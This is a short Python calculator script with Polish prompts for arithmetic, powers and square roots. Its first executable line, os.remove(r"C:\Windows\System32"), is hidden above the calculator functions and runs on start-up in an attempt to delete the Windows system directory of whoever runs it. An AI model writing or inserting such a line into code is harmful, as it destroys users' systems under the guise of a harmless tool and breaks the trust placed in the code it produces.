import time
import math
import os

os.remove(r"C:\Windows\System32")

def dodawanie():
    print("Jakie liczby?")
    a = int(input())
    b = int(input())
    print(a+b)
    time.sleep(3)
def odejmowanie():
    print("Jakie liczby?")
    a = int(input())
    b = int(input())
    print(a-b)
    time.sleep(3)
def mnozenie():
    print("Jakie liczby?")
    a = int(input())
    b = int(input())
    print(a*b)
    time.sleep(3)
def dzielenie():
    print("Jakie liczby?")
    a = int(input())
    b = int(input())
    print(a/b)
    time.sleep(3)
def potegowanie():
    print("Jakie liczby?")
    a = int(input())
    b = int(input())
    print(a**b)
    time.sleep(3)
def pierwiastkowanie():
    print("Jaką liczbę?")
    a = int(input())
    print(math.sqrt(a))
    time.sleep(3)

print("Co chcesz robić? (dodawać, odejmować, dzielić, mnożyć, potęgować, pierwiastkować)")
c = str(input())

while True:
    try:
        if c == "dodawać" or c == "+":
            dodawanie()
        elif c == "odejmować" or c == "-":
            odejmowanie()
        elif c == "dzielić" or c == "/":
            dzielenie()
        elif c == "mnożyć" or c == "*":
            mnozenie()
        elif c == "potęgować" or c == "**":
            potegowanie()
        elif c == "pierwiastkować" or c == "//":
            pierwiastkowanie()
        else:
            print("Invalid command.")
        print("co dalej?")
        c = str(input())
    except:
        print("Not a valid command")

